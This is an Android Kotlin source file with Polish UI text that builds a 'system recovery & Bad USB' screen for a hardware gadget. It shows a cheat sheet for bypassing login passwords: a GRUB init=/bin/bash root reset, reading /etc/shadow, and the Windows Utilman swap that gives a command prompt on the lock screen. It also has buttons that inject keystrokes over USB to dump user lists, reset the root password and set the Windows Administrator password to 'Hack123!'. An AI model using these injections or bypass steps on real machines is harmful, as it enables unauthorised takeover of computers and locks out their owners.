package com.example.bruceir

import android.content.Intent
import android.graphics.Color
import android.net.Uri
import android.os.Bundle
import android.view.Gravity
import android.widget.*
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import com.google.android.material.button.MaterialButton
import com.google.android.material.card.MaterialCardView

class SystemRecoveryGuidesActivity : AppCompatActivity() {

    private lateinit var tvSelectedIso: TextView
    private var selectedIsoUri: Uri? = null

    private val filePickerLauncher = registerForActivityResult(ActivityResultContracts.GetContent()) { uri: Uri? ->
        if (uri != null) {
            selectedIsoUri = uri
            val path = uri.path ?: "custom.iso"
            tvSelectedIso.text = "Wybrany obraz / ISO: $path"
            Toast.makeText(this, "Wybrano własny obraz do strumieniowania!", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        window.statusBarColor = Color.rgb(7, 10, 15)
        window.navigationBarColor = Color.rgb(7, 10, 15)

        buildScreen()
    }

    private fun dp(value: Int) = (value * resources.displayMetrics.density).toInt()

    private fun getEmbeddedTinyCoreStatus(): String {
        return try {
            val stream = assets.open("boot/tinycore.iso")
            stream.close()
            "Wbudowany w APK: TinyCore Linux (Zapakowany na sztywno)"
        } catch (e: Exception) {
            "Brak wbudowanego obrazu w APK"
        }
    }

    private fun buildScreen() {
        val scroll = ScrollView(this).apply {
            setBackgroundColor(Color.rgb(7, 10, 15))
            clipToPadding = false
            setPadding(dp(18), dp(14), dp(18), dp(100))
        }
        val root = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }
        scroll.addView(root)
        setContentView(scroll)

        val header = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
        }
        val titleStack = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }
        titleStack.addView(text("SYSTEM RECOVERY & BAD USB BOOT", 10f, 0xFF43C59E.toInt(), true))
        titleStack.addView(text("TinyCore ISO & Single User Mode", 22f, Color.WHITE, true).apply {
            setPadding(0, dp(3), 0, 0)
        })
        header.addView(titleStack, LinearLayout.LayoutParams(0, -2, 1f))

        val backButton = MaterialButton(this).apply {
            text = "←"
            setOnClickListener { finish() }
        }
        header.addView(backButton, LinearLayout.LayoutParams(dp(50), dp(46)))
        root.addView(header)

        root.addView(text("Wbudowany system TinyCore w APK, sieć ISO oraz automatyka Bad USB (po kablu USB).", 12f, 0xFF9EADBD.toInt()).apply {
            setPadding(0, dp(6), 0, dp(14))
        })

        // 0. TINYCORE ISO & NETWORK BOOT CARD
        val netBootCard = card()
        val netBootLayout = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }
        netBootLayout.addView(text("🐧 Wbudowany TinyCore Linux (Na sztywno w APK)", 16f, 0xFF43C59E.toInt(), true).apply { setPadding(0, 0, 0, dp(6)) })
        netBootLayout.addView(text(
            "Obraz TinyCore Linux jest spakowany bezpośrednio w zasobach (assets) aplikacji i gotowy do strumieniowania do pamięci RAM komputera przez LilyGO.",
            13f, Color.WHITE
        ).apply { setPadding(0, dp(4), 0, dp(8)) })

        tvSelectedIso = text(getEmbeddedTinyCoreStatus(), 12f, 0xFF43C59E.toInt())
        netBootLayout.addView(tvSelectedIso, verticalParams(dp(4)))

        val btnPickIso = MaterialButton(this).apply {
            text = "📁 Użyj własnego pliku ISO / Obrazu"
            setBackgroundColor(0xFF283545.toInt())
            setTextColor(Color.WHITE)
            setOnClickListener { filePickerLauncher.launch("*/*") }
        }
        netBootLayout.addView(btnPickIso, verticalParams(dp(6)))

        netBootCard.addView(netBootLayout)
        root.addView(netBootCard, LinearLayout.LayoutParams(-1, -2).apply { bottomMargin = dp(12) })

        // 1. CHEAT SHEET CARD
        val cheatSheetText = 
                "🐧 LINUX SINGLE USER MODE:\n" +
                "• W GRUB naciśnij 'e' na wpisie kernela\n" +
                "• Dopisz na końcu linii zaczynającej się od 'linux':\n" +
                "  init=/bin/bash\n" +
                "• Uruchom: Ctrl + X\n" +
                "• Po uruchomieniu powłoki:\n" +
                "  1. mount -o remount,rw /\n" +
                "  2. passwd root\n" +
                "  3. reboot\n\n" +
                "📋 LINUX ZRSUT UŻYTKOWNIKÓW:\n" +
                "  cat /etc/passwd\n" +
                "  cat /etc/shadow\n\n" +
                "🪟 WINDOWS UTILMAN HACK (Ominięcie hasła na lock screenie):\n" +
                "• Z nośnika ratunkowego / CMD wejdź na partycję systemu:\n" +
                "  cd /d C:\\Windows\\System32\n" +
                "  ren utilman.exe utilman.bak\n" +
                "  copy cmd.exe utilman.exe\n" +
                "• Po restarcie na ekranie logowania kliknij Ułatwienia Dostępu:\n" +
                "  net user Administrator NoweHaslo123!\n" +
                "  net user"

        val cheatCard = card()
        val cheatLayout = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }
        cheatLayout.addView(text("📋 Ściągawka Komend (Cheat Sheet)", 16f, 0xFF43C59E.toInt(), true).apply { setPadding(0, 0, 0, dp(6)) })
        cheatLayout.addView(text(cheatSheetText, 12f, 0xFF9EADBD.toInt()).apply {
            setBackgroundResource(R.drawable.button_glass_bg)
            setPadding(dp(12), dp(10), dp(12), dp(10))
        })
        cheatCard.addView(cheatLayout)
        root.addView(cheatCard, LinearLayout.LayoutParams(-1, -2).apply { bottomMargin = dp(12) })

        // 2. LINUX AUTOMATION (BAD USB)
        val linuxCard = card()
        val linuxLayout = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }
        linuxLayout.addView(text("🐧 Linux Single User & Net Users (Bad USB)", 16f, Color.WHITE, true).apply { setPadding(0, 0, 0, dp(6)) })

        val btnDumpUsers = MaterialButton(this).apply {
            text = "📋 Bad USB: Zrzut Użytkowników (cat /etc/passwd)"
            setBackgroundColor(0xFF283545.toInt())
            setTextColor(Color.WHITE)
            setOnClickListener {
                BruceBleIrLink.sendCustomCommand(this@SystemRecoveryGuidesActivity, "bu string \"cat /etc/passwd\"\nbu enter")
                Toast.makeText(this@SystemRecoveryGuidesActivity, "Wysłano zrzut /etc/passwd przez Bad USB", Toast.LENGTH_SHORT).show()
            }
        }
        linuxLayout.addView(btnDumpUsers, verticalParams(dp(4)))

        val btnSendLinux = MaterialButton(this).apply {
            text = "🚀 Bad USB: Wejdź w Single User Mode (mount + passwd)"
            setBackgroundColor(0xFF43C59E.toInt())
            setTextColor(Color.BLACK)
            setOnClickListener {
                BruceBleIrLink.sendCustomCommand(this@SystemRecoveryGuidesActivity, "bu string \"mount -o remount,rw / && passwd root\"\nbu enter")
                Toast.makeText(this@SystemRecoveryGuidesActivity, "Wysłano skrypt Single User przez Bad USB", Toast.LENGTH_SHORT).show()
            }
        }
        linuxLayout.addView(btnSendLinux, verticalParams(dp(6)))
        linuxCard.addView(linuxLayout)
        root.addView(linuxCard, LinearLayout.LayoutParams(-1, -2).apply { bottomMargin = dp(12) })

        // 3. WINDOWS AUTOMATION (BAD USB)
        val winCard = card()
        val winLayout = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }
        winLayout.addView(text("🪟 Windows Utilman & Net User (Bad USB)", 16f, Color.WHITE, true).apply { setPadding(0, 0, 0, dp(6)) })

        val btnDumpWinUsers = MaterialButton(this).apply {
            text = "📋 Bad USB: Lista Użytkowników Windows (net user)"
            setBackgroundColor(0xFF283545.toInt())
            setTextColor(Color.WHITE)
            setOnClickListener {
                BruceBleIrLink.sendCustomCommand(this@SystemRecoveryGuidesActivity, "bu string \"net user\"\nbu enter")
                Toast.makeText(this@SystemRecoveryGuidesActivity, "Wysłano net user przez Bad USB", Toast.LENGTH_SHORT).show()
            }
        }
        winLayout.addView(btnDumpWinUsers, verticalParams(dp(4)))

        val btnSendWin = MaterialButton(this).apply {
            text = "🚀 Bad USB: Zmiana Hasła Administratora Windows"
            setBackgroundColor(0xFFE53935.toInt())
            setTextColor(Color.WHITE)
            setOnClickListener {
                BruceBleIrLink.sendCustomCommand(this@SystemRecoveryGuidesActivity, "bu string \"net user Administrator Hack123!\"\nbu enter")
                Toast.makeText(this@SystemRecoveryGuidesActivity, "Wysłano skrypt zmiany hasła admina przez Bad USB", Toast.LENGTH_SHORT).show()
            }
        }
        winLayout.addView(btnSendWin, verticalParams(dp(6)))
        winCard.addView(winLayout)
        root.addView(winCard)
    }

    private fun verticalParams(top: Int = 0) = LinearLayout.LayoutParams(-1, -2).apply {
        topMargin = top
    }

    private fun card() = MaterialCardView(this).apply {
        radius = dp(16).toFloat()
        setCardBackgroundColor(0xFF141B25.toInt())
        strokeColor = 0xFF283545.toInt()
        strokeWidth = dp(1)
        cardElevation = 0f
        setContentPadding(dp(14), dp(12), dp(14), dp(12))
    }

    private fun text(value: String, size: Float, color: Int, bold: Boolean = false) =
        TextView(this).apply {
            text = value
            textSize = size
            setTextColor(color)
            if (bold) setTypeface(typeface, android.graphics.Typeface.BOLD)
        }
}
